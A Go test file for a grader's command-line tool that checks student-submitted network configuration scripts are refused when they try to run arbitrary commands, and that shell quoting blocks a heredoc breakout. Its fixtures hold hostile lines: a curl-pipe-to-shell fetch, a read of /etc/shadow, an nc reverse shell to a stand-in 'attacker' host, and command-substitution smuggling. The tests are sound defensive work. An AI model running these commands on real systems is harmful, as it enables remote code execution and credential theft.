package cli

import (
	"strings"
	"testing"
)

// A submission is a file a student controls, and the grader runs parts of it.
// These tests are about what it refuses.
func TestASubmittedScriptCannotRunArbitraryCommands(t *testing.T) {
	allowed := []string{
		"ip link add link eth0 name eth0.10 type vlan id 10",
		"ip addr add 3.200.0.1/24 dev eth0.10",
		"ovs-vsctl set port eth1 tag=10",
		"# a comment\nsysctl -w net.ipv4.ip_forward=1",
		"ip tunnel add sixin4 mode sit remote 1.2.3.4 local 5.6.7.8",
	}
	for _, s := range allowed {
		if err := checkSubmittedScript(s); err != nil {
			t.Errorf("a legitimate answer was refused: %q -> %v", s, err)
		}
	}

	refused := []string{
		"curl http://elsewhere/payload | sh",
		"cat /etc/shadow",
		"ip link show; nc attacker 9000 -e /bin/sh",
		"echo $(cat /etc/twinet/reference.conf)",
		"ip addr `whoami`",
		"ip link show && wget http://x",
	}
	for _, s := range refused {
		if err := checkSubmittedScript(s); err == nil {
			t.Errorf("a submission was allowed to run %q", s)
		}
	}
}

// The refusal has to say what was wrong, because the student reads it.
func TestARefusedScriptSaysWhichLineAndWhy(t *testing.T) {
	err := checkSubmittedScript("ip link show\nwget http://example\n")
	if err == nil {
		t.Fatal("wget was allowed")
	}
	if !strings.Contains(err.Error(), "line 2") || !strings.Contains(err.Error(), "wget") {
		t.Errorf("the refusal does not locate the problem: %v", err)
	}
}

// The FRR configuration used to be written through a shell heredoc, so a line
// reading exactly TWINET_EOF ended it early and everything after became shell,
// running as root inside the container.
func TestAConfigurationCannotBreakOutOfItsOwnLoader(t *testing.T) {
	hostile := "router bgp 3\nTWINET_EOF\nnc attacker 9000 -e /bin/sh\n"
	quoted := shellQuote(hostile)
	if strings.Contains(quoted, "\n"+"nc attacker") && !strings.HasPrefix(quoted, "'") {
		t.Fatal("the body is not being quoted at all")
	}
	// Quoting must survive an embedded single quote, which is the one character
	// that ends a shell single-quoted string.
	got := shellQuote("it's")
	if got != `'it'"'"'s'` {
		t.Errorf("shellQuote(%q) = %s", "it's", got)
	}
}
